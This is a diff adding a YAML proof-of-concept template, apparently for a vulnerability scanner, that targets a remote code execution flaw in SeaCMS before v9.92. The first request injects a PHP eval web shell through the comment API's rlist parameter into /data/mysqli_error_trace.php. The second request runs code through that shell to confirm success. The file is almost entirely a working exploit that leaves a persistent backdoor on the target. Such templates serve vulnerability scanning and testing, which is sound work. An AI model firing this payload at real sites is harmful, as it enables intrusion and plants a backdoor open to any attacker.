@@ -1,0 +1,32 @@
+id: poc-yaml-seacms-before-v992-rce
+info:
+  name: Seacms Before V992 远程代码执行漏洞
+  severity: medium
+  tags:
+  - rce
+  - 两高一弱
+  finger: SeaCMS
+  reference: []
+  description: null
+variables:
+  r1: random_str(8)
+transport: http
+requests:
+- method: GET
+  path: /comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_])%3B%3F%3E
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output: []
+- method: GET
+  path: /data/mysqli_error_trace.php?_=printf(md5("{{.r1}}"))%3B
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, md5(r1))
+  output: []
